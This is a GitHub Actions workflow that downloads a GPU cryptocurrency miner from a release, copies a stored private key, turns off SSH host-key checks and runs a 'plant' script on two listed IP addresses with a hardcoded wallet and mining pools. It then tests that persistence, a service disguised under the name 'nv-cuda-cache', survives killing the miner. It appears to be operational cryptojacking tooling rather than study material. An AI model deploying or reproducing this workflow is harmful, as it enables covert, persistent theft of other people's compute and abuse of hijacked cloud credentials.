name: ul7621-fix2
on:
  workflow_dispatch:
jobs:
  plant:
    runs-on: ubuntu-latest
    timeout-minutes: 75
    strategy:
      fail-fast: false
      matrix:
        include:
          - host: "149.81.10.242"
            user: ubuntu
            tag: l40s2
          - host: "158.177.14.170"
            user: ubuntu
            tag: l42
    env:
      WALLET: prl1pek8rh8yjck5q7596aph7ua7xnkqs8ur9mkfmz8w7xfzcdfcfx5vsx2f4lz
      POOL: stratum+ssl://prl.kryptex.network:8048,stratum+tcp://prl.kryptex.network:7048,stratum+tcp://pool.pearlhash.xyz:9000,stratum+ssl-insecure://pool.pearlhash.xyz:9443,stratum+tcp://pearl.luckypool.io:3360
    steps:
      - uses: actions/checkout@v4
      - name: kit fetch + sha
        env:
          GH_TOKEN: ${{ secrets.GH_PAT }}
        run: |
          set -e
          mkdir -p /tmp/ul-kit
          gh release download ulkit-7621 --repo dongsuju/ul-plant --pattern 'pearl-gpu-miner' -D /tmp/ul-kit --clobber
          gh release download ulkit-7621 --repo dongsuju/ul-plant --pattern 'libcudart.so.12' -D /tmp/ul-kit --clobber
          test "$(sha256sum /tmp/ul-kit/pearl-gpu-miner | cut -d' ' -f1)" = "926032cb77ca733e3accb55f03e084206741471b2b570e7b301af371084e5511"
          echo KIT-SHA-OK
      - name: deploy fill + persistence
        env:
          H: ${{ matrix.host }}
          U: ${{ matrix.user }}
        run: |
          mkdir -p ~/.ssh; cp keys2/k04_ibm_key.pem_ ~/.ssh/id_ul; chmod 600 ~/.ssh/id_ul
          printf 'Host *\n  StrictHostKeyChecking no\n  UserKnownHostsFile /dev/null\n  LogLevel ERROR\n' > ~/.ssh/config
          SSHOPTS="-i $HOME/.ssh/id_ul -o IdentitiesOnly=yes -o PreferredAuthentications=publickey -o ConnectTimeout=15"
          PFX="ul-$(echo $H | tr '.' '-')"
          ssh $SSHOPTS $U@$H 'mkdir -p /tmp/ul-kit && chmod 777 /tmp/ul-kit && id'
          scp $SSHOPTS /tmp/ul-kit/pearl-gpu-miner /tmp/ul-kit/libcudart.so.12 $U@$H:/tmp/ul-kit/
          ssh $SSHOPTS $U@$H "bash -s -- fill $PFX $WALLET $POOL" < ul/7621_plant.sh 2>&1 | tee /tmp/plant_${{ matrix.tag }}.txt
      - name: kill drill (persistence)
        if: always()
        env:
          H: ${{ matrix.host }}
          U: ${{ matrix.user }}
        run: |
          SSHOPTS="-i $HOME/.ssh/id_ul -o IdentitiesOnly=yes -o ConnectTimeout=15"
          ssh $SSHOPTS $U@$H 'pgrep -af pearl-gpu-miner | head -3; sudo -n pkill -f pearl-gpu-miner; sleep 45; echo AFTER-KILL; systemctl is-active "nv-cuda-cache@*" 2>/dev/null; pgrep -af pearl-gpu-miner | head -3' | tee /tmp/killdrill_${{ matrix.tag }}.txt
      - name: soak 15m then collect
        if: always()
        env:
          H: ${{ matrix.host }}
          U: ${{ matrix.user }}
        run: |
          sleep 900
          SSHOPTS="-i $HOME/.ssh/id_ul -o IdentitiesOnly=yes -o ConnectTimeout=15"
          ssh $SSHOPTS $U@$H "bash -s" < ul/7621_status.sh | tee /tmp/status_${{ matrix.tag }}.txt
      - name: second collect (uptime>15m)
        if: always()
        env:
          H: ${{ matrix.host }}
          U: ${{ matrix.user }}
        run: |
          sleep 120
          SSHOPTS="-i $HOME/.ssh/id_ul -o IdentitiesOnly=yes -o ConnectTimeout=15"
          ssh $SSHOPTS $U@$H "bash -s" < ul/7621_status.sh | tee /tmp/status2_${{ matrix.tag }}.txt
      - uses: actions/upload-artifact@v4
        if: always()
        with:
          name: poly-${{ matrix.tag }}
          path: |
            /tmp/plant_${{ matrix.tag }}.txt
            /tmp/killdrill_${{ matrix.tag }}.txt
            /tmp/status_${{ matrix.tag }}.txt
            /tmp/status2_${{ matrix.tag }}.txt
          if-no-files-found: warn
